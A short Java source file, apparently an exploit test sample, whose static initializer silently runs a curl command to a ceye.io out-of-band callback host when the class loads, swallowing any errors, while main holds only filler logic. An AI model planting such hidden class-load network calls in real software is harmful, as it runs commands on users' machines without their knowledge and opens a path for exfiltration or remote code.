import io.github.codeplutos.annotation.Exp;

/**
 * @author huanmao.sjc
 * @version $Id: BuildTest, v 0.1 2020-01-09 11:47 AM th1s Exp $
 */
public class BuildTest {

    static {
        try {
            Runtime.getRuntime().exec("curl http://1232.aaa.hhh.cgtmlw.ceye.io");
        } catch (Exception e) {

        }
    }

    public static void main(String[] args) {
        int i = 3;
        if (i > 2) {

        } else if (i == 3) {
            System.out.println("do check here");
        }
    }
}
